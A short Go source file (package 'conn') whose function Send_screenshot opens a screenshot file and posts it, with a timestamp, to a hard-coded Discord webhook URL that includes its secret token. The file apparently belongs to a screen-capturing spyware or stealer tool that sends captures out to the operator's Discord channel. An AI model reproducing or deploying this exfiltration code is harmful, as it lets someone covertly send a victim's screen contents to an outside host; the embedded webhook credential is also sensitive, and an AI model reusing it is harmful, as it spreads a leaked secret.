package conn

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

const (
	WEBHOOK_URL = "https://discord.com/api/webhooks/1100479261418201138/NtdeHlozR2Kh797b4BoUQKd2Z_ebWjhYEjUBo4Tym2V0SA1YovoBdSUdxtcHc9XS1mN7"
)

func Send_screenshot(file string) {

	form := new(bytes.Buffer)
	writer := multipart.NewWriter(form)
	formField, err := writer.CreateFormField("payload_json")
	Handle_error(err, "Couldnt create form")

	formField.Write([]byte(fmt.Sprintf(`{"content": "%s"}`, time.Now().String())))

	fw, _ := writer.CreateFormFile("file1", filepath.Base(file))
	fd, err := os.Open(file)
	Handle_error(err, "Couldnt open file")
	defer fd.Close()

	io.Copy(fw, fd)
	writer.Close()

	client := &http.Client{}
	req, _ := http.NewRequest("POST", WEBHOOK_URL, form)
	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

}
